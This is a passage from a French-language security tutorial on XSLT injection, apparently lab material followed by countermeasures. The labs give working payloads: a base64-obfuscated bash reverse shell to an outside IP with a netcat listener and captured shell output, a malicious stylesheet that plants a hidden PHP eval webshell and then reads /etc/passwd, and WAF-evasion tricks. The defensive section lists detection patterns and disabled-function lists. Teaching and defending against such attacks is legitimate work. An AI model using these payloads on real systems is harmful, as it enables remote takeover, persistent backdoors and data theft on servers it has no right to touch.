        <xsl:variable name="result" select="ob:toString($process)"/>
        <p>User: <xsl:value-of select="$result"/></p>
        
        <!-- Reverse shell -->
        <xsl:variable name="shell" select="rt:exec($rtObj, 
          'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Étape 1 : Préparer le listener**

```bash
nc -lvnp 4444
```

**Étape 2 : Envoyer le payload**

```bash
curl -X POST http://target.com/transform \
  -H "Content-Type: application/xml" \
  --data-binary @exploit.xml
```

**Étape 3 : Recevoir le shell**

```bash
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [192.168.1.100] 45678
bash: no job control in this shell
www-data@server:/$
```

***

#### 🧪 Lab 5 : Exploitation via upload de fichier

**Scénario :** Application web qui accepte des uploads XML+XSLT pour générer des rapports

**Étape 1 : Créer le rapport malveillant**

**report.xml :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="report.xsl"?>
<report>
  <title>Rapport mensuel</title>
  <data>
    <item>Element 1</item>
    <item>Element 2</item>
  </data>
</report>
```

**report.xsl (malveillant) :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <!-- Affichage normal du rapport -->
    <html>
      <body>
        <h1><xsl:value-of select="report/title"/></h1>
        <ul>
          <xsl:for-each select="report/data/item">
            <li><xsl:value-of select="."/></li>
          </xsl:for-each>
        </ul>
        
        <!-- Backdoor invisible -->
        <xsl:variable name="backdoor" select="php:function('file_put_contents',
          '../uploads/.config.php',
          '&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;')"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Étape 2 : Upload les fichiers**

```bash
curl -F "xml=@report.xml" -F "xsl=@report.xsl" http://target.com/upload
```

**Étape 3 : Accéder au backdoor**

```bash
curl -X POST http://target.com/uploads/.config.php \
  -d "x=system('cat /etc/passwd');"
```

***

#### 🧪 Lab 6 : Bypass WAF avec encodage

**Scénario :** WAF bloque les mots-clés `system`, `exec`, `eval`

**Technique : Utiliser des variables et concaténation**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <!-- Construire la fonction dynamiquement -->
    <xsl:variable name="func1">sys</xsl:variable>
    <xsl:variable name="func2">tem</xsl:variable>
    <xsl:variable name="function" select="concat($func1, $func2)"/>
    
    <!-- Encoder la commande en base64 -->
    <xsl:variable name="cmd_b64">d2hvYW1p</xsl:variable> <!-- "whoami" en base64 -->
    <xsl:variable name="decode">base64_decode</xsl:variable>
    
    <!-- Exécution obfusquée -->
    <xsl:variable name="result" select="php:function(
      'call_user_func',
      $function,
      php:function($decode, $cmd_b64)
    )"/>
    
    <output><xsl:value-of select="$result"/></output>
  </xsl:template>
</xsl:stylesheet>
```

**Autres techniques de bypass :**

1. **Utiliser des commentaires XML**

```xml
<xsl:value-of select="php:function('sys<!-- bypass -->tem','whoami')"/>
```

2. **Unicode/HTML entities**

```xml
<xsl:value-of select="php:function('&#115;ystem','whoami')"/>
```

3. **CDATA sections**

```xml
<xsl:variable name="cmd"><![CDATA[system('whoami')]]></xsl:variable>
```

***

### 6️⃣ CONTRE-MESURES ET RECOMMANDATIONS

#### 🛡️ Défenses côté développement

**1. Ne jamais accepter de XSLT non fiable**

❌ **Vulnérable :**

```php
<?php
$xml = new DOMDocument();
$xml->load($_FILES['xml']['tmp_name']);

$xsl = new DOMDocument();
$xsl->load($_FILES['xsl']['tmp_name']); // ← DANGEREUX !

$proc = new XSLTProcessor();
$proc->importStyleSheet($xsl);
echo $proc->transformToXML($xml);
?>
```

✅ **Sécurisé :**

```php
<?php
$xml = new DOMDocument();
$xml->load($_FILES['xml']['tmp_name']);

// Utiliser seulement des XSLT prédéfinis
$xsl = new DOMDocument();
$xsl->load('/var/www/templates/safe_template.xsl'); // ← Template sûr

$proc = new XSLTProcessor();
$proc->importStyleSheet($xsl);
echo $proc->transformToXML($xml);
?>
```

***

**2. Désactiver les fonctions dangereuses**

**PHP :**

```php
<?php
$proc = new XSLTProcessor();

// Désactiver les fonctions PHP dans XSLT
$proc->registerPHPFunctions([]); // Liste vide = aucune fonction

// OU whitelist de fonctions sûres seulement
$proc->registerPHPFunctions(['htmlspecialchars', 'strip_tags']);
?>
```

**Java (Saxon) :**

```java
TransformerFactory factory = TransformerFactory.newInstance();

// Désactiver l'accès aux fonctions d'extension
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

// Désactiver l'accès aux fichiers externes
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

**.NET :**

```csharp
XslCompiledTransform xslt = new XslCompiledTransform();

// Désactiver les scripts
XsltSettings settings = new XsltSettings();
settings.EnableScript = false;
settings.EnableDocumentFunction = false;

xslt.Load("template.xsl", settings, null);
```

***

**3. Validation stricte des entrées**

```python
from lxml import etree
import re

def is_safe_xslt(xsl_content):
    """Valide que le XSLT ne contient pas de patterns dangereux"""
    
    dangerous_patterns = [
        r'php:function',           # PHP functions
        r'java:java\.lang',        # Java execution
        r'msxsl:script',           # .NET scripts
        r'document\s*\(',          # External documents
        r'exsl:document',          # File writing
        r'include\s+href',         # Includes
        r'import\s+href',          # Imports
        r'system-property',        # Info disclosure
        r'unparsed-entity-uri',    # Path disclosure
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, xsl_content, re.IGNORECASE):
            return False, f"Pattern dangereux détecté: {pattern}"
    
    # Valider que c'est du XML bien formé
    try:
        etree.fromstring(xsl_content.encode('utf-8'))
    except etree.XMLSyntaxError:
        return False, "XSLT malformé"
    
    return True, "OK"

# Utilisation
with open('user_upload.xsl', 'r') as f:
    xsl_content = f.read()

is_safe, message = is_safe_xslt(xsl_content)
if not is_safe:
    raise SecurityError(f"XSLT rejeté: {message}")
```

***

**4. Sandboxing et isolation**

**Docker avec restrictions :**

```dockerfile
FROM php:8.1-apache

# Installer uniquement les extensions nécessaires
RUN apt-get update && apt-get install -y libxslt1-dev \
    && docker-php-ext-install xsl

# Créer un utilisateur non-privilégié
RUN useradd -m -s /bin/bash xsltuser

# Permissions restrictives
RUN chown -R xsltuser:xsltuser /var/www/html
USER xsltuser

# Désactiver les fonctions dangereuses
RUN echo "disable_functions = exec,passthru,shell_exec,system,proc_open,popen" >> /usr/local/etc/php/php.ini
```

**Exécution avec timeout :**

```python
import subprocess
import signal

def transform_with_timeout(xml_file, xsl_file, timeout=5):
    """Exécute XSLT avec timeout pour éviter DoS"""
    try:
        result = subprocess.run(
            ['xsltproc', xsl_file, xml_file],
            capture_output=True,
            timeout=timeout,
            text=True
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        raise Exception("Transformation XSLT trop longue (DoS?)")
```

***

**5. Content Security Policy (CSP)**

Pour les transformations XSLT côté client :

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self'; 
               connect-src 'self'; 
               style-src 'self' 'unsafe-inline';">
```

Cela empêche :

* Chargement de scripts externes
* Requêtes vers des domaines externes
* Exfiltration de données

***

#### 🛡️ Défenses côté infrastructure

**1. Principe du moindre privilège**

```bash
# L'utilisateur web ne doit PAS avoir accès à :
chmod 600 /etc/passwd
chmod 600 /etc/shadow
chmod 600 /var/www/.htpasswd

# Limiter les permissions du répertoire web
chown -R www-data:www-data /var/www/html
chmod 750 /var/www/html
```

**2. SELinux / AppArmor**

**AppArmor profile pour Apache :**

```
#include <tunables/global>

/usr/sbin/apache2 {
  #include <abstractions/base>
  #include <abstractions/php>

  # Interdire l'accès aux fichiers sensibles
  deny /etc/passwd r,
  deny /etc/shadow r,
  deny /root/** r,
  
  # Autoriser seulement le répertoire web
  /var/www/html/** r,
  /tmp/xslt_cache/** rw,
}
```

**3. Monitoring et alerting**

**Détection d'exploitation :**

```bash
# Surveiller les accès suspects dans les logs
tail -f /var/log/apache2/access.log | grep -E "(document\(|php:function|java:java)"

# Alerter sur les créations de fichiers PHP
auditctl -w /var/www/html -p wa -k webshell_creation
```

**SIEM Rules (exemple Splunk) :**

```
index=web_logs sourcetype=apache
| rex field=_raw "(?<xslt_function>document\(|php:function|msxsl:script|java:java\.lang)"
| where isnotnull(xslt_function)
| stats count by src_ip, xslt_function
| where count > 5
```

***

#### 🛡️ Checklist de sécurité

```
☐ Ne jamais accepter de fichiers XSLT d'utilisateurs non fiables
☐ Utiliser uniquement des templates XSLT prédéfinis et validés
☐ Désactiver toutes les fonctions d'extension (PHP, Java, .NET)
☐ Désactiver document(), include(), import()
☐ Activer FEATURE_SECURE_PROCESSING
☐ Définir ACCESS_EXTERNAL_DTD et ACCESS_EXTERNAL_STYLESHEET à ""
☐ Valider et nettoyer toutes les entrées XML
☐ Implémenter des timeouts pour éviter les DoS
☐ Exécuter les transformations dans un sandbox/container
☐ Appliquer le principe du moindre privilège
☐ Surveiller les logs pour détecter les tentatives d'exploitation
☐ Utiliser des processeurs XSLT à jour et patchés
☐ Ne pas exposer les messages d'erreur détaillés aux utilisateurs
☐ Implémenter une CSP stricte pour XSLT côté client
☐ Utiliser des outils d'analyse statique sur les XSLT
```

***

### 📚 RESSOURCES COMPLÉMENTAIRES

#### 📖 Documentation officielle

* [W3C XSLT 1.0 Specification](https://www.w3.org/TR/xslt-10/)
* [OWASP XSLT Injection](https://owasp.org/www-community/vulnerabilities/XSLT_Injection)
* [EXSLT Extensions](http://exslt.org/)

#### 🔧 Outils

* **xsltproc** - Processeur en ligne de commande
* **Burp Suite** - Proxy pour tester les injections
* **XXEinjector** - Tool pour XXE/XSLT

#### 🎓 Labs et CTF

* [Root Me - XSLT Code Execution](https://www.root-me.org/)
* [PortSwigger Web Security Academy](https://portswigger.net/web-security)
* [HackTheBox](https://www.hackthebox.com/)

#### 📄 CVE pertinents

* CVE-2024-48990 (needrestart - Library path hijacking)
* CVE-2019-8917 (PHP libxslt - XXE)
* CVE-2015-3247 (libxslt - DoS)

***

### 🎯 RÉSUMÉ EXÉCUTIF

#### Points clés à retenir

**🔴 Dangers principaux :**

1. **RCE** via PHP/Java/.NET wrappers
2. **LFI** via document(), include(), import()
3. **SSRF** via document() avec URLs externes
4. **Information Disclosure** via erreurs et system-property()
5. **Same-Origin Bypass** (Safari uniquement)

**🟡 Processeurs les plus vulnérables :**

* **Libxslt** (PHP, Python, Ruby, navigateurs) : Lecture de fichiers, erreurs bavards
* **Xalan-J** (Java) : RCE via Runtime.exec()
* **MSXML** (IE/.NET) : RCE via msxsl:script

**🟢 Défense en profondeur :**

```
Couche 1: Ne pas accepter XSLT utilisateur
Couche 2: Désactiver fonctions dangereuses
Couche 3: Validation stricte des entrées
Couche 4: Sandboxing / Isolation
Couche 5: Monitoring / Alerting
```

**💡 Règle d'or :**

> **XSLT = Code exécutable. Traitez-le comme tel !**

***
